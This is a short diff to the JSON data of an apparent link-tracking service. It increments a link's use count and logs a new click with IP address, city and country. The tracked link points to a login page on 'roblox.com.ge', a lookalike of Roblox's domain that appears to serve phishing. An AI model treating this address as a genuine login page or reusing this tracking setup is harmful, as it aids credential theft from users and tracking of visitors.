@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1715,
+    "useCount": 1716,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13888,6 +13888,14 @@
         "city": "Addis Ababa",
         "flag": "🇪🇹",
         "countryCode": "ET"
+      },
+      {
+        "timestamp": 1777741245898,
+        "ip": "66.249.64.173",
+        "country": "United States",
+        "city": "Mountain View",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
